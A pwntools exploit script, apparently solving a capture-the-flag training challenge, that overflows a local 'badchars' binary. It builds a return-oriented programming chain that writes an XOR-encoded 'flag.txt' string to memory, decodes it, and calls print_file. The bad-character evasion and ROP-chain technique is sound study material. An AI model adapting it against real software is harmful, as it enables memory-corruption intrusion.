from pwn import *


exe = ELF('./badchars')
context.log_level = 'debug'
context.arch = exe.arch

def encode_badchars(data, badchars, key):
    result = b""
    encoded_byte_offsets = []
    for idx, b in enumerate(data):
        if b in badchars:
            result += bytes([b ^ ord(key)])
            encoded_byte_offsets.append(idx)
            continue
        result += bytes([b])
    return result, encoded_byte_offsets

# Set the pwntools context

# Initialize ROP
rop = ROP(exe)

# Gadgets
writable_data_segment = 0x00601029                         # .data segment
xor_r15_r14_ret = p64(0x00400628)                          # xor byte [r15], r14b; ret;
write_memory_gadget = p64(0x00400634)                      # mov qword [r13], r12; ret;
pop_r12_pop_r13_pop_r14_pop_r15_ret = p64(0x0040069c)      # pop r12; pop r13; pop r14; pop r15; ret;
pop_r14_pop_r15_ret = p64(0x004006a0)                      # pop r14; pop r15; ret;
pop_rdi_ret = p64(rop.search(move=0,regs=['rdi']).address) # pop rdi; ret;

print_file = p64(exe.plt['print_file'])

flag_string = b"flag.txt"
badchars = b"xga.\n\r"
key = b"\x90"
target, encoded_byte_offsets = encode_badchars(flag_string, badchars, key)


# Write the encoded target to the .data section
idx = 0
addr_size = 8
while idx < len(target):
    data = target[idx:idx+addr_size]
    write_location = p64(writable_data_segment + idx)
    rop.raw(pop_r12_pop_r13_pop_r14_pop_r15_ret)
    rop.raw(data)
    rop.raw(write_location)
    rop.raw(p64(0xdeadbeefdeadbeef))    # junk for r14
    rop.raw(p64(0xdeadbeefdeadbeef))    # junk for r15
    rop.raw(write_memory_gadget)
    idx += addr_size

# Decode the encoded target in the .data segment one byte at a time
for encoded_byte_offset in encoded_byte_offsets:
    write_location = p64(writable_data_segment + encoded_byte_offset)
    rop.raw(pop_r14_pop_r15_ret)
    rop.raw(p64(ord(key)))
    rop.raw(write_location)
    rop.raw(xor_r15_r14_ret)

# Read the file
rop.raw(pop_rdi_ret)
rop.raw(writable_data_segment)
rop.raw(print_file)

offset = 40

payload = flat({
    offset:[
        rop.chain()
    ]
})


io = process(exe.path)
# Pwn!
io.clean()
io.sendline(payload)
io.interactive()
